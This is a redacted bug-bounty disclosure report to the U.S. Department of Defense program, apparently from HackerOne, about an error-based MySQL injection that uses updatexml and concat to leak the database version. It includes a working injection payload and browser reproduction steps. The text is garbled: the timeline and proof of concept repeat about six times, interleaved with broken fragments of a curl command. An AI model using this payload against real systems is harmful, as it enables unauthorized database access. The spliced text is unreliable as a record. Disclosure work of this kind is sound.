██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
Content-Type: application/x-www-form-urlencoded' -H 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
Referer: https://██████/███████?█████=K' -H 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
Upgrade-Insecure-Requests: 1' \
    -b 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
_ga=GA1.2.2009424950.1494732845; PHPSESSID=35472be86b20b8a7f8c15737a8977f49' \
    --data-binary 

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
█████=K*\' OR updatexml(null,concat(0x3a3a,version()),null) AND \'aSgl\'=\'aSgl&sid=35472be86b20b8a7f8c15737a8977f49&emailid=█████████&emailid2=██████████' \
    

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
https://██████/███'
```
You will see: "<br><br>You have this list added to your current optionsXPATH syntax error: '::`████`'"
which is the MySQL version! 

**information:**
Current User: `███████@localhost`
Databases: `█████`
Version: `███`

## Suggested Mitigation/Remediation Actions
Sanitize sanitize sanitize!!

Thanks as always ;)
-Corben Douglas (@sxcurity)

## Timeline

- **Report Filed**
- **2017-05-27** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2017-05-31** @cdl: Any updates?
- **2017-05-31** @bwluebberthill: @cdl I was unable to verify the vulnerability using your PoC curl commands. Some new line characters were added to them somehow, but even after removing them the command does not produce the expected response. Can you provide and updated PoC?
- **2017-05-31** @cdl: Hey there @bwluebberthill for some reason I am not able to reproduce this in curl anymore either, however I can still verify this vulnerability exists!!

Here is an updated proof of concept.

## Reproduction
1.) Open Firefox 
2.) Install HackBar browser addon (https://addons.mozilla.org/en-US/firefox/addon/hackbar/?src=userprofile)
3.) Install NoRedirect addon (https://addons.mozilla.org/en-US/firefox/addon/noredirect/) (This will require a browser restart)
4.) After you have installed these extensions go to `about:addons` and find NoRedirect 
5.) Click options and Add `https://█████████/*` and click OK. (this disables the redirects on this site)
6.) Now hold the fn button and click F9 to open HackBar
7.) Paste `https://████████/███████` in the URL and click Enable Post data
8.) In the Post Data input paste 
```
██████████=K' OR updatexml(null,concat(0x3a3a,version()),null) AND 'sxcurity'='sxcurity&sid=e1e5471e1a1afbfcdae7c1ff893d10a6&emailid=asdf%40hackerone.com&emailid2=asdf%40hackerone.com: undefined
```
then click execute.

You will see
`XPATH syntax error: +'::███'` 
which is the version.

█████████

I have added a video demonstrating this proof of concept, since the process might be confusing!

████████


Thanks!
-Corben Douglas (@sxcurity)
- **Report Severity Updated**
- **Report Triaged**
- **2017-07-09** @cdl: Hey there, any updates?
- **2017-07-28** @bwluebberthill: Greetings @cdl,

We have been advised that the vulnerability you reported has been resolved. Before we close this report, we would appreciate it if you could confirm that the vulnerability no longer exists.

If we do not receive a response within two weeks, we will send you a second request. If we do not receive a response from you within two weeks of the second notice, we will close this report as resolved.

If you do not believe this vulnerability has been effectively resolved or if you have any questions, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team
- **2017-07-29** @cdl: I can confirm this is fixed! Thanks
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
